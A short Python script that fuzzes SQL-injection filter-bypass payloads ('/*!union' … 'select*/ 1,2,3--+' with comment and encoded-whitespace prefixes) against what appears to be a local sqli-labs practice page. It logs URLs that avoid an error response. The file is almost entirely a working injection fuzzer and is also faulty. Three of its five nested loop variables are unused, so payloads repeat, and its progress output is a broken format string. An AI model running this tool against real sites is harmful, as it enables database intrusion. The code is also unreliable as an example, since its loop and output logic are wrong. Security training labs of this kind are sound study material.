#!-*-encoding:utf-8 -*-
import requests
import sys

fuzz_a = ['/*', '*/', '/*!', '/**/', '?', '/', '*', '=', '`', '%', '.', '-', '+', ' ', '', '|', '!', '~', '%00', '%20',
          '%09', '%0a', '%0b', '%0c', '%0d', '%a0', '/**/']
fuzz_b = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
fuzz_c = ['%0a', '%0b', '%0c', '%0d', '%0e', '%0f', '%0g', '%0h', '%0i', '%0j', '%0l', '%0m', '%0n', '%0o', '%0p',
          '%0q', '%r', '%s', '%0t', '%0u', '%0v', '%0w', '%0x', '%0y', '%0z']
fuzz_d = ['\'']
fuzz = fuzz_a + fuzz_b + fuzz_c + fuzz_d
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"}
url_start = "http://localhost/sql/Less-1/index.php?id=1"  # 定义url

len = len(fuzz)
num = 0
for a in fuzz:
    for b in fuzz:
        for c in fuzz:
            for d in fuzz:
                for e in fuzz:
                    num += 1
                    payload = a + '/*!union' + b + 'select*/ 1,2,3--+'
                    url = url_start + payload  #
                    sys.stdout.write(' ' * 30 + '\r')
                    sys.stdout.flush()
                    print("Now Url " + url)
                    sys.stdout.write("完成进度:%s/%s\r")  # % (num, len))
                    sys.stdout.flush()
                    res = requests.get(url, headers=headers)
                    if 'line' not in res.text:
                        with open("c:/Result.txt", 'a') as r:
                            r.write(url + '\n')


